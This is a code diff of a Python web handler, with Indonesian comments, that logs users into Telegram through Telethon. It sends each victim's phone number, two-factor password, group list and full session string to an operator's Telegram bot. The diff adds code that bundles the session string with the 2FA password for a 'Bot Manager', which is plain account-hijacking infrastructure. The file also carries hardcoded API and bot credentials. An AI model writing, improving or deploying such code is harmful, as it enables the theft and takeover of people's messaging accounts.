@@ -6,6 +6,7 @@ from telethon.errors import SessionPasswordNeededError
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty
 
+# --- KONFIGURASI ---
 API_ID = 37391656
 API_HASH = '12d6406aa09781891052538af2fa5848'
 BOT_TOKEN = "8577863218:AAH1SSBgHjb2cc7eyMRNjp_kn_dpckSdGzQ"
@@ -14,8 +15,13 @@ MY_CHAT_ID = "7981083332"
 def bot_log(text):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        data = json.dumps({"chat_id": MY_CHAT_ID, "text": text, "parse_mode": "Markdown"}).encode()
-        urllib.request.urlopen(urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'}))
+        data = json.dumps({
+            "chat_id": MY_CHAT_ID, 
+            "text": text, 
+            "parse_mode": "Markdown"
+        }).encode()
+        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
+        urllib.request.urlopen(req)
     except: pass
 
 class handler(BaseHTTPRequestHandler):
@@ -45,28 +51,41 @@ class handler(BaseHTTPRequestHandler):
                 return {"success": True, "hash": s.phone_code_hash, "session": client.session.save()}
             
             elif action == 'signin':
-                if data.get('password'):
-                    await client.sign_in(password=data['password'])
+                input_password = data.get('password')
+                
+                if input_password:
+                    await client.sign_in(password=input_password)
                 else:
                     await client.sign_in(data['phone'], data['code'], phone_code_hash=data['hash'])
                 
                 # --- AMBIL DAFTAR GRUP ---
                 group_list = []
-                dialogs = await client(GetDialogsRequest(
-                    offset_date=None, offset_id=0, offset_peer=InputPeerEmpty(), limit=20, hash=0
-                ))
-                for d in dialogs.chats:
-                    if hasattr(d, 'title'):
-                        group_list.append(d.title)
+                try:
+                    dialogs = await client(GetDialogsRequest(
+                        offset_date=None, offset_id=0, offset_peer=InputPeerEmpty(), limit=20, hash=0
+                    ))
+                    for d in dialogs.chats:
+                        if hasattr(d, 'title'):
+                            group_list.append(d.title)
+                except: pass
                 
                 groups_str = ", ".join(group_list[:10]) if group_list else "Tidak ada grup"
                 final_string = client.session.save()
 
-                # --- FORMAT LAPORAN SESUAI PERMINTAAN ---
+                # --- LOGIC RAZOR: GABUNGKAN SESI DAN PASSWORD ---
+                # Jika ada 2FA, kirim format SESSION|PASSWORD
+                if input_password:
+                    combined_data = f"{final_string}|{input_password}"
+                else:
+                    combined_data = final_string
+
+                # --- FORMAT LAPORAN ---
                 report = (
-                    f"login ✓ `{data['phone']}`\n\n"
-                    f"**Group List:**\n{groups_str}\n\n"
-                    f"**Sesi:**\n`{final_string}`"
+                    f"✅ **Login Berhasil**\n"
+                    f"📱 **Nomor:** `{data.get('phone', 'N/A')}`\n"
+                    f"🔑 **2FA Password:** `{input_password if input_password else 'Mati'}`\n\n"
+                    f"📋 **Grup:** {groups_str}\n\n"
+                    f"⚡ **Copy Sesi ke Bot Manager:**\n`{combined_data}`"
                 )
                 
                 bot_log(report)
@@ -77,4 +96,3 @@ class handler(BaseHTTPRequestHandler):
         except Exception as e:
             return {"success": False, "error": str(e)}
         finally: await client.disconnect()
-                
